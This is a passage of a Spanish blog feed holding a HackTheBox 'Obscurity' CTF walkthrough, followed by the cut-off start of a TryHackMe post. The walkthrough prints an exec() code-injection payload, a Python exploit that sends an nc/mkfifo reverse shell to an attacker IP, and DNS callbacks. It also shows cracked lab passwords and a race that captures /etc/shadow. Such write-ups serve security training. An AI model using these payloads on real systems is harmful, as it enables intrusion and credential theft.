&lt;p&gt;En la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-34-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;wfuzz&#34;&gt;WFUZZ&lt;/h3&gt;
&lt;p&gt;Utilizamos wfuzz para encontrar el archivo &amp;lsquo;SuperSecureServer.py&amp;rsquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/obscurity# wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s documentation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: &lt;span class=&#34;nv&#34;&gt;4614&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;
ID           Response   Lines    Word     Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;                                                                             
&lt;span class=&#34;o&#34;&gt;===================================================================&lt;/span&gt;

000001245:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;170&lt;/span&gt; L    &lt;span class=&#34;m&#34;&gt;498&lt;/span&gt; W    &lt;span class=&#34;m&#34;&gt;5892&lt;/span&gt; Ch     &lt;span class=&#34;s2&#34;&gt;&amp;#34;develop&amp;#34;&lt;/span&gt;                                                                           

Total time: 116.5698
Processed Requests: &lt;span class=&#34;m&#34;&gt;4614&lt;/span&gt;
Filtered Requests: &lt;span class=&#34;m&#34;&gt;4613&lt;/span&gt;
Requests/sec.: 39.58142
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos el archivo &amp;lsquo;SuperSecureServer.py&amp;rsquo; del servidor.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-36-33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce---supersecureserverpy&#34;&gt;RCE - SuperSecureServer.py&lt;/h2&gt;
&lt;p&gt;Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (&amp;lsquo;directorioABC&amp;rsquo;) entre comillas, este elimina las comillas, pasa por la funcion &lt;code&gt;exec()&lt;/code&gt; y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.&lt;/p&gt;
&lt;p&gt;Codigo vulnerable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;urllib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;output = &amp;#39;Document: {}&amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Keep the output for later debug&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# This is how you do string formatting, right?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos el siguiente payload para ejecutar comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n\n&lt;/span&gt;os.system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; COMANDO &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#&amp;#34;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos pruebas haciendo una consultas DNS a nuestra maquina:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;\n\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;os.system(&amp;#34;nslookup $PATH 10.10.15.122&amp;#34;)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; #&amp;#34;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-53-20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shell inversa y obtenemos acceso con el usuario www-data:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-53-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Codigo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#cmd = &amp;#39;\&amp;#39;\n\nos.system(&amp;#34; COMMAND &amp;#34;)\n #&amp;#34;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#cmd = &amp;#39;\&amp;#39;\n\nos.system(&amp;#34;nslookup $(which nc) 10.10.14.14&amp;#34;)\n #&amp;#34;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;\n\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;os.system(&amp;#34; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.14 1336 &amp;gt;/tmp/f &amp;#34;)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; #&amp;#34;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;urllib&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;safe&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://obscure.htb:8080/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---robert&#34;&gt;USER - Robert&lt;/h2&gt;
&lt;p&gt;Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que &lt;strong&gt;encripta/desencripta&lt;/strong&gt; archivos utilizando una clave.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_14-54-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_14-56-43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutar el script nos muestra los parametros que necesita para encriptar y desencriptar un archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h
python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-i InFile&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-o OutFile&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-k Key&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

Encrypt with 0bscura&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s encryption algorithm

optional arguments:
  -h, --help  show this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; message and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
  -i InFile   The file to &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt;
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
www-data@obscure:/home/robert$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos dicho script para poder desencriptar el archivo &lt;code&gt;out.txt&lt;/code&gt; con el archivo &lt;code&gt;check.txt&lt;/code&gt; como clave para obtener la clave de encriptacion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 SuperSecureCrypt.py -i out.txt -o /tmp/what.txt -k &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat check.txt&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-00-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave para poder desencriptar el archivo out.txt y vemos que es el mismo mensaje que el archivo check.txt tiene, por lo que ya tenemos la clave:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 SuperSecureCrypt.py -i out.txt -o /tmp/what2.txt -k &lt;span class=&#34;s2&#34;&gt;&amp;#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&amp;#34;&lt;/span&gt; -d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-02-54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave para desencriptar el archivo &lt;code&gt;passwordreminder.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/what3.txt -k &lt;span class=&#34;s2&#34;&gt;&amp;#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&amp;#34;&lt;/span&gt; -d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-04-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;robert:SecThruObsFTW
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-05-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-06-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dicho script pregunta por usuario y su contraseña existentes en la maquina, lee &lt;code&gt;/etc/shadow&lt;/code&gt; y escribe su contenido en &lt;code&gt;/tmp/SSH/&lt;/code&gt;, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.&lt;/p&gt;
&lt;p&gt;Ya que tenemos un usuario con sus credenciales ejecutamos el script pasando el usuario robert y la contraseña &lt;code&gt;SecThruObsFTW&lt;/code&gt;, al hacer esto se escribira en /tmp/SSH/ las contraseñas encriptadas de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al mismo tiempo en otra shell utilizamos &lt;code&gt;watch&lt;/code&gt; para ver los cambios que hay en /tmp/SSH/ obteniendo con &lt;code&gt;cat&lt;/code&gt; el archivo temporal de las contraseñas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;watch -t -d -g -n 0.1 &lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /tmp/SSH/* |base64 &amp;gt; /tmp/b.txt &amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_17-52-37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos el hash del usuario root y robert, utilizamos John The Ripper para desencriptar la contraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_17-55-28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos la contraseña, una shell con privilegios root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
root:mercedes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_17-57-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/obscurity/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/obscurity/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Cicada-3301 Vol:1</title>
        <link>https://sckull.github.io/posts/cicada3301vol1/</link>
        <pubDate>Thu, 07 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 07 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/cicada3301vol1/</guid>
        <description>Cicada-3301 Vol:1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Cicada-3301 Vol:1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Cicada-3301 Vol:1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A basic steganography and cryptography challenge room based on the Cicada 3301 challenges&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;148&lt;/td&gt;
